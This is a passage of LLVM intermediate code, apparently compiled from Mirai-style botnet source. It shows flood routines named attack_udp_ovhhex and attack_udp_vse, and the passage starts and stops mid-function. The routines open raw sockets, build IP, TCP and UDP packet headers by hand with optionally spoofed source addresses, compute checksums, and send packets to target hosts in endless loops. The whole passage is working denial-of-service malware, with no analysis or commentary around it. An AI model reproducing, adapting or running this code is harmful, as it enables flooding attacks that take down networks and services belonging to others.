  %.mux = select i1 %73, i32 %72, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %94
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %94 ], [ 0, %.lr.ph65.split.preheader ]
  %74 = call i32 @rand() #10
  %75 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %76 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %75, i8** %76, align 8
  %77 = call zeroext i16 @htons(i16 zeroext %12) #11
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %77, i16* %79, align 2
  %80 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %81 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %80, i32* %81, align 4
  %82 = icmp eq i32 %80, -1
  br i1 %82, label %.us-lcssa.us.loopexit77, label %83

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:83:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %84 = call i32 @bind(i32 %80, %struct.sockaddr* nonnull %31, i32 16) #10
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %86 = load i8, i8* %85, align 4
  %87 = icmp ult i8 %86, 32
  br i1 %87, label %88, label %94

; <label>:88:                                     ; preds = %83
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = call i32 @ntohl(i32 %90) #11
  %92 = call i32 @htonl(i32 %91) #11
  %93 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %92, i32* %93, align 4
  br label %94

; <label>:94:                                     ; preds = %88, %83
  %95 = bitcast %struct.attack_target* %78 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %80, %struct.sockaddr* %95, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %97 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %97, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_ovhhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %292, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %112, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %65 = call i32 @rand() #10
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %8, i64 %68
  store i8* %66, i8** %69, align 8
  %70 = getelementptr inbounds i8, i8* %66, i64 20
  %71 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %72 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %72, align 1
  %73 = call zeroext i16 @htons(i16 zeroext 60) #11
  %74 = getelementptr inbounds i8, i8* %66, i64 2
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %12) #11
  %77 = getelementptr inbounds i8, i8* %66, i64 4
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 4
  %79 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %79, align 4
  %80 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %80, align 1
  %81 = getelementptr inbounds i8, i8* %66, i64 12
  %82 = bitcast i8* %81 to i32*
  store i32 %36, i32* %82, align 4
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %68, i32 1
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i8, i8* %66, i64 16
  %86 = bitcast i8* %85 to i32*
  store i32 %84, i32* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %18) #11
  %88 = bitcast i8* %70 to i16*
  store i16 %87, i16* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %20) #11
  %90 = getelementptr inbounds i8, i8* %66, i64 22
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %46) #11
  %93 = zext i16 %92 to i32
  %94 = getelementptr inbounds i8, i8* %66, i64 24
  %95 = bitcast i8* %94 to i32*
  store i32 %93, i32* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 32
  %97 = bitcast i8* %96 to i16*
  store i16 %64, i16* %97, align 4
  %98 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %71, align 1
  %99 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %98, align 1
  %100 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %101 = bitcast i8* %99 to i16*
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds i8, i8* %66, i64 44
  %103 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %102, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %103, align 1
  %105 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %104, align 1
  store i8 10, i8* %105, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 56
  %107 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %106, align 1
  %108 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %107, align 1
  %109 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %108, align 1
  store i8 6, i8* %109, align 1
  %110 = add nsw i32 %67, 1
  store i32 %110, i32* %5, align 4
  %111 = icmp slt i32 %110, %43
  br i1 %111, label %.lr.ph130.split.us, label %.preheader.loopexit

; <label>:112:                                    ; preds = %39
  %113 = call i32 @close(i32 %37) #10
  br label %292

.preheader.loopexit:                              ; preds = %.lr.ph130.split.us
  br label %.preheader

.preheader.loopexit138:                           ; preds = %.lr.ph130.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit138, %.preheader.loopexit, %.preheader128
  %114 = icmp eq i32 %36, -1
  %115 = and i32 %11, 65535
  %116 = icmp eq i32 %115, 65535
  %117 = and i32 %17, 65535
  %118 = icmp eq i32 %117, 65535
  %119 = and i32 %19, 65535
  %120 = icmp eq i32 %119, 65535
  %121 = icmp eq i32 %21, 65535
  %122 = icmp eq i32 %22, 65535
  %123 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %124 = call i32 @rand() #10
  %125 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %126 = load i32, i32* %5, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %8, i64 %127
  store i8* %125, i8** %128, align 8
  %129 = getelementptr inbounds i8, i8* %125, i64 20
  %130 = getelementptr inbounds i8, i8* %125, i64 40
  store i8 69, i8* %125, align 4
  %131 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 %10, i8* %131, align 1
  %132 = call zeroext i16 @htons(i16 zeroext 60) #11
  %133 = getelementptr inbounds i8, i8* %125, i64 2
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = call zeroext i16 @htons(i16 zeroext %12) #11
  %136 = getelementptr inbounds i8, i8* %125, i64 4
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 4
  %138 = getelementptr inbounds i8, i8* %125, i64 8
  store i8 %14, i8* %138, align 4
  %139 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %140 = getelementptr inbounds i8, i8* %125, i64 6
  %141 = bitcast i8* %140 to i16*
  store i16 %139, i16* %141, align 2
  %142 = getelementptr inbounds i8, i8* %125, i64 9
  store i8 6, i8* %142, align 1
  %143 = getelementptr inbounds i8, i8* %125, i64 12
  %144 = bitcast i8* %143 to i32*
  store i32 %36, i32* %144, align 4
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %127, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = getelementptr inbounds i8, i8* %125, i64 16
  %148 = bitcast i8* %147 to i32*
  store i32 %146, i32* %148, align 4
  %149 = call zeroext i16 @htons(i16 zeroext %18) #11
  %150 = bitcast i8* %129 to i16*
  store i16 %149, i16* %150, align 4
  %151 = call zeroext i16 @htons(i16 zeroext %20) #11
  %152 = getelementptr inbounds i8, i8* %125, i64 22
  %153 = bitcast i8* %152 to i16*
  store i16 %151, i16* %153, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %46) #11
  %155 = zext i16 %154 to i32
  %156 = getelementptr inbounds i8, i8* %125, i64 24
  %157 = bitcast i8* %156 to i32*
  store i32 %155, i32* %157, align 4
  %158 = getelementptr inbounds i8, i8* %125, i64 32
  %159 = bitcast i8* %158 to i16*
  store i16 %64, i16* %159, align 4
  %160 = getelementptr inbounds i8, i8* %125, i64 41
  store i8 2, i8* %130, align 1
  %161 = getelementptr inbounds i8, i8* %125, i64 42
  store i8 4, i8* %160, align 1
  %162 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %163 = bitcast i8* %161 to i16*
  store i16 %162, i16* %163, align 2
  %164 = getelementptr inbounds i8, i8* %125, i64 44
  %165 = getelementptr inbounds i8, i8* %125, i64 45
  store i8 4, i8* %164, align 1
  %166 = getelementptr inbounds i8, i8* %125, i64 46
  store i8 2, i8* %165, align 1
  %167 = getelementptr inbounds i8, i8* %125, i64 47
  store i8 8, i8* %166, align 1
  store i8 10, i8* %167, align 1
  %168 = getelementptr inbounds i8, i8* %125, i64 56
  %169 = getelementptr inbounds i8, i8* %125, i64 57
  store i8 1, i8* %168, align 1
  %170 = getelementptr inbounds i8, i8* %125, i64 58
  store i8 3, i8* %169, align 1
  %171 = getelementptr inbounds i8, i8* %125, i64 59
  store i8 3, i8* %170, align 1
  store i8 6, i8* %171, align 1
  %172 = add nsw i32 %126, 1
  store i32 %172, i32* %5, align 4
  %173 = icmp slt i32 %172, %43
  br i1 %173, label %.lr.ph130.split, label %.preheader.loopexit138

.loopexit.loopexit:                               ; preds = %215
  br label %.loopexit.backedge

.loopexit.loopexit137:                            ; preds = %273
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit137
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %114, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %215
  %174 = phi i32 [ %232, %215 ], [ 0, %.lr.ph.split.us.preheader ]
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8*, i8** %8, i64 %175
  %177 = load i8*, i8** %176, align 8
  %178 = bitcast i8* %177 to %struct.iphdr*
  %179 = getelementptr inbounds i8, i8* %177, i64 20
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %175, i32 2
  %181 = load i8, i8* %180, align 4
  %182 = icmp ult i8 %181, 32
  br i1 %182, label %183, label %190

; <label>:183:                                    ; preds = %.lr.ph.split.us
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %175, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @ntohl(i32 %185) #11
  %187 = call i32 @htonl(i32 %186) #11
  %188 = getelementptr inbounds i8, i8* %177, i64 16
  %189 = bitcast i8* %188 to i32*
  store i32 %187, i32* %189, align 4
  br label %190

; <label>:190:                                    ; preds = %.lr.ph.split.us, %183
  %191 = getelementptr inbounds i8, i8* %177, i64 12
  %192 = bitcast i8* %191 to i32*
  store i32 0, i32* %192, align 4
  br i1 %116, label %193, label %196

; <label>:193:                                    ; preds = %190
  %194 = getelementptr inbounds i8, i8* %177, i64 4
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 4
  br label %196

; <label>:196:                                    ; preds = %193, %190
  br i1 %118, label %197, label %199

; <label>:197:                                    ; preds = %196
  %198 = bitcast i8* %179 to i16*
  store i16 0, i16* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %197, %196
  br i1 %120, label %200, label %203

; <label>:200:                                    ; preds = %199
  %201 = getelementptr inbounds i8, i8* %177, i64 22
  %202 = bitcast i8* %201 to i16*
  store i16 0, i16* %202, align 2
  br label %203

; <label>:203:                                    ; preds = %200, %199
  br i1 %121, label %204, label %207

; <label>:204:                                    ; preds = %203
  %205 = getelementptr inbounds i8, i8* %177, i64 24
  %206 = bitcast i8* %205 to i32*
  store i32 0, i32* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %203
  br i1 %122, label %208, label %211

; <label>:208:                                    ; preds = %207
  %209 = getelementptr inbounds i8, i8* %177, i64 28
  %210 = bitcast i8* %209 to i32*
  store i32 0, i32* %210, align 4
  br label %211

; <label>:211:                                    ; preds = %208, %207
  br i1 %123, label %215, label %212

; <label>:212:                                    ; preds = %211
  %213 = getelementptr inbounds i8, i8* %177, i64 38
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 2
  br label %215

; <label>:215:                                    ; preds = %212, %211
  %216 = getelementptr inbounds i8, i8* %177, i64 10
  %217 = bitcast i8* %216 to i16*
  store i16 0, i16* %217, align 2
  %218 = bitcast i8* %177 to i16*
  %219 = call zeroext i16 @checksum_generic(i16* %218, i32 20)
  store i16 %219, i16* %217, align 2
  %220 = getelementptr inbounds i8, i8* %177, i64 36
  %221 = bitcast i8* %220 to i16*
  store i16 0, i16* %221, align 4
  %222 = call zeroext i16 @htons(i16 zeroext 40) #11
  %223 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %178, i8* nonnull %179, i16 zeroext %222, i32 40)
  store i16 %223, i16* %221, align 4
  %224 = getelementptr inbounds i8, i8* %177, i64 22
  %225 = bitcast i8* %224 to i16*
  %226 = load i16, i16* %225, align 2
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %175, i32 0, i32 1
  store i16 %226, i16* %227, align 2
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %175, i32 0
  %229 = bitcast %struct.sockaddr_in* %228 to %struct.sockaddr*
  %230 = call i64 @sendto(i32 %37, i8* nonnull %177, i64 60, i32 16384, %struct.sockaddr* %229, i32 16) #10
  %231 = load i32, i32* %5, align 4
  %232 = add nsw i32 %231, 1
  store i32 %232, i32* %5, align 4
  %233 = icmp slt i32 %232, %43
  br i1 %233, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %273
  %234 = phi i32 [ %290, %273 ], [ 0, %.lr.ph.split.preheader ]
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds i8*, i8** %8, i64 %235
  %237 = load i8*, i8** %236, align 8
  %238 = bitcast i8* %237 to %struct.iphdr*
  %239 = getelementptr inbounds i8, i8* %237, i64 20
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %235, i32 2
  %241 = load i8, i8* %240, align 4
  %242 = icmp ult i8 %241, 32
  br i1 %242, label %243, label %250

; <label>:243:                                    ; preds = %.lr.ph.split
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %235, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = call i32 @ntohl(i32 %245) #11
  %247 = call i32 @htonl(i32 %246) #11
  %248 = getelementptr inbounds i8, i8* %237, i64 16
  %249 = bitcast i8* %248 to i32*
  store i32 %247, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %.lr.ph.split, %243
  br i1 %116, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %237, i64 4
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 4
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %257

; <label>:255:                                    ; preds = %254
  %256 = bitcast i8* %239 to i16*
  store i16 0, i16* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %255, %254
  br i1 %120, label %258, label %261

; <label>:258:                                    ; preds = %257
  %259 = getelementptr inbounds i8, i8* %237, i64 22
  %260 = bitcast i8* %259 to i16*
  store i16 0, i16* %260, align 2
  br label %261

; <label>:261:                                    ; preds = %258, %257
  br i1 %121, label %262, label %265

; <label>:262:                                    ; preds = %261
  %263 = getelementptr inbounds i8, i8* %237, i64 24
  %264 = bitcast i8* %263 to i32*
  store i32 0, i32* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %262, %261
  br i1 %122, label %266, label %269

; <label>:266:                                    ; preds = %265
  %267 = getelementptr inbounds i8, i8* %237, i64 28
  %268 = bitcast i8* %267 to i32*
  store i32 0, i32* %268, align 4
  br label %269

; <label>:269:                                    ; preds = %266, %265
  br i1 %123, label %273, label %270

; <label>:270:                                    ; preds = %269
  %271 = getelementptr inbounds i8, i8* %237, i64 38
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 2
  br label %273

; <label>:273:                                    ; preds = %269, %270
  %274 = getelementptr inbounds i8, i8* %237, i64 10
  %275 = bitcast i8* %274 to i16*
  store i16 0, i16* %275, align 2
  %276 = bitcast i8* %237 to i16*
  %277 = call zeroext i16 @checksum_generic(i16* %276, i32 20)
  store i16 %277, i16* %275, align 2
  %278 = getelementptr inbounds i8, i8* %237, i64 36
  %279 = bitcast i8* %278 to i16*
  store i16 0, i16* %279, align 4
  %280 = call zeroext i16 @htons(i16 zeroext 40) #11
  %281 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %238, i8* %239, i16 zeroext %280, i32 40)
  store i16 %281, i16* %279, align 4
  %282 = getelementptr inbounds i8, i8* %237, i64 22
  %283 = bitcast i8* %282 to i16*
  %284 = load i16, i16* %283, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %235, i32 0, i32 1
  store i16 %284, i16* %285, align 2
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %235, i32 0
  %287 = bitcast %struct.sockaddr_in* %286 to %struct.sockaddr*
  %288 = call i64 @sendto(i32 %37, i8* %237, i64 60, i32 16384, %struct.sockaddr* %287, i32 16) #10
  %289 = load i32, i32* %5, align 4
  %290 = add nsw i32 %289, 1
  store i32 %290, i32* %5, align 4
  %291 = icmp slt i32 %290, %43
  br i1 %291, label %.lr.ph.split, label %.loopexit.loopexit137

; <label>:292:                                    ; preds = %4, %112
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 54)
  %22 = call i8* @table_retrieve_val(i32 54, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %215, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %71, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br i1 %31, label %.lr.ph73.split.us.preheader, label %.lr.ph73.split.preheader

.lr.ph73.split.preheader:                         ; preds = %.lr.ph73
  br label %.lr.ph73.split

.lr.ph73.split.us.preheader:                      ; preds = %.lr.ph73
  br label %.lr.ph73.split.us

.lr.ph73.split.us:                                ; preds = %.lr.ph73.split.us.preheader, %.lr.ph73.split.us
  %32 = phi i32 [ %69, %.lr.ph73.split.us ], [ 0, %.lr.ph73.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 128, i64 1) #10
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds i8*, i8** %9, i64 %34
  store i8* %33, i8** %35, align 8
  %36 = getelementptr inbounds i8, i8* %33, i64 20
  %37 = getelementptr inbounds i8, i8* %33, i64 28
  store i8 69, i8* %33, align 4
  %38 = getelementptr inbounds i8, i8* %33, i64 1
  store i8 %11, i8* %38, align 1
  %39 = load i32, i32* %6, align 4
  %40 = trunc i32 %39 to i16
  %41 = add i16 %40, 32
  %42 = call zeroext i16 @htons(i16 zeroext %41) #11
  %43 = getelementptr inbounds i8, i8* %33, i64 2
  %44 = bitcast i8* %43 to i16*
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext %13) #11
  %46 = getelementptr inbounds i8, i8* %33, i64 4
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 4
  %48 = getelementptr inbounds i8, i8* %33, i64 8
  store i8 %15, i8* %48, align 4
  %49 = getelementptr inbounds i8, i8* %33, i64 9
  store i8 17, i8* %49, align 1
  %50 = load i32, i32* @LOCAL_ADDR, align 4
  %51 = getelementptr inbounds i8, i8* %33, i64 12
  %52 = bitcast i8* %51 to i32*
  store i32 %50, i32* %52, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %34, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds i8, i8* %33, i64 16
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext %19) #11
  %58 = bitcast i8* %36 to i16*
  store i16 %57, i16* %58, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %21) #11
  %60 = getelementptr inbounds i8, i8* %33, i64 22
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = add i16 %40, 12
  %63 = call zeroext i16 @htons(i16 zeroext %62) #11
  %64 = getelementptr inbounds i8, i8* %33, i64 24
  %65 = bitcast i8* %64 to i16*
  store i16 %63, i16* %65, align 2
  %66 = bitcast i8* %37 to i32*
  store i32 -1, i32* %66, align 4
  %67 = getelementptr inbounds i8, i8* %33, i64 32
  call void @util_memcpy(i8* %67, i8* %22, i32 %39)
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  %70 = icmp slt i32 %69, %29
  br i1 %70, label %.lr.ph73.split.us, label %.preheader.loopexit

; <label>:71:                                     ; preds = %25
  %72 = call i32 @close(i32 %23) #10
  br label %215

.preheader.loopexit:                              ; preds = %.lr.ph73.split.us
  br label %.preheader

.preheader.loopexit89:                            ; preds = %.lr.ph73.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit89, %.preheader.loopexit, %.preheader71
  %73 = and i32 %12, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %18, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %20, 65535
  %78 = icmp eq i32 %77, 65535
  br label %.loopexit

.lr.ph73.split:                                   ; preds = %.lr.ph73.split.preheader, %.lr.ph73.split
  %79 = phi i32 [ %119, %.lr.ph73.split ], [ 0, %.lr.ph73.split.preheader ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8*, i8** %9, i64 %81
  store i8* %80, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %80, i64 20
  %84 = getelementptr inbounds i8, i8* %80, i64 28
  store i8 69, i8* %80, align 4
